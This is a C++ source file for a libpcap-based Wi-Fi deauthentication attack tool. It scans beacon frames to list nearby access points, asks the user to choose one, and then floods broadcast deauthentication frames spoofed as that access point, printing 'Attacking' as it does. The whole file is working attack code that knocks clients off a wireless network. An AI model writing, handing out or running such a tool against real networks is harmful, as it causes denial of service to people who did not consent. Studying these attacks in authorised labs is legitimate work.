#include "header.h"

void usage(){
    printf("syntax: <interface>\n");
    printf("sample: wlan0\n");
}

void find_ap(pcap_t *handle,map<vector<uint8_t>, struct ssid> &ssid_list) {
    int count=0;
    while(true) {
        if(count==100) break;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap_header *radio = (struct radiotap_header *)packet;
        struct beacon_frame *frame = (struct beacon_frame *)(packet+radio->it_len);
        struct ssid *size=(struct ssid *)(packet+radio->it_len+sizeof(struct beacon_frame)+sizeof(struct beacon_fixed));

        if(frame->type != 0x0080) continue;

        uint8_t *target = frame->bssid;
        vector<uint8_t> mac;
        vector<uint8_t> essid;

        for(int i=0; i<6; i++)
            mac.push_back(*(target+i));
        count++;
        uint8_t size_ = size->ssid_len;
        for(int i=0; i<size_; i++) {
            essid.push_back(*((uint8_t *)(packet+radio->it_len+sizeof(struct beacon_frame)+sizeof(struct beacon_fixed) + 2 + i)));
        }

        struct ssid ssid;
        ssid.essid=essid;
        ssid.essid_len=size_;
        ssid_list.insert({mac, ssid});
    }
}

void print_ap(map<vector<uint8_t>, struct ssid> ssid_list) {
    printf("\t BSSID\t\t ESSID\n");
    int num=1;
    for(auto i=ssid_list.begin();i!=ssid_list.end(); i++) {
        printf("%d. ", num++);
        for(int j=0; j<6; j++) {
            printf("%02x", i->first[j]);
            if(j<5) {
                printf(":");
            }
        }
        printf("\t");
        for(auto k=i->second.essid.begin();k<i->second.essid.end(); k++)
            printf("%c", (*k));
        printf("\n");
    }
}

void deauth_attack(pcap_t *handle, vector<uint8_t>mac) {
    struct deauth deauth;
    deauth.radio.it_version=0x00;
    deauth.radio.it_pad=0x00;
    deauth.radio.it_len=0x08;
    deauth.radio.it_present=0x00;
    for(int i=0; i<6; i++) {
        deauth.beacon.bssid[i]=mac.at(i);
        deauth.beacon.smac[i]=mac.at(i);
    }
    memset(deauth.beacon.dmac, 0xFF, 6);
    deauth.beacon.type=0x00c0;
    deauth.beacon.duration=0x0000;
    deauth.beacon.seq=0x0000;
    deauth.wm.code=0x0007;

    for(int i=0; i<1000000; i++) {
        if(i % 100 == 0) {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&deauth), sizeof(deauth));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            usleep(1);
        }
    }
}

int main(int argc, char* argv[])
{
    if(argc != 2) {
        usage();
        return -1;
    }
    char* dev=argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return -1;
    }
    map<vector<uint8_t>, struct ssid> ssid_list;
    vector<uint8_t> target_mac;
    struct ssid target_name;

    while(true) {
        find_ap(handle, ssid_list);
        print_ap(ssid_list);

        int num;
        printf("Target: ");
        scanf("%d", &num);

        int number=1;
        for(auto i=ssid_list.begin(); i!=ssid_list.end(); i++) {
            if(num!=number++) continue;
            target_mac=i->first;
            target_name=i->second;
        }
        printf("--------------target------------\n\t");
        for(int i=0; i<6; i++) {
            printf("%02x", target_mac[i]);
            if(i<5) {
                printf(":");
            }
        }
        printf("\n\t");
        for(auto k=target_name.essid.begin(); k!=target_name.essid.end(); k++) {
            printf("%c", (*k));
        }

        printf("\n--------------------------------\n\n");
        printf("Attacking\n");

        deauth_attack(handle,target_mac);
        system("clear");
     }
}
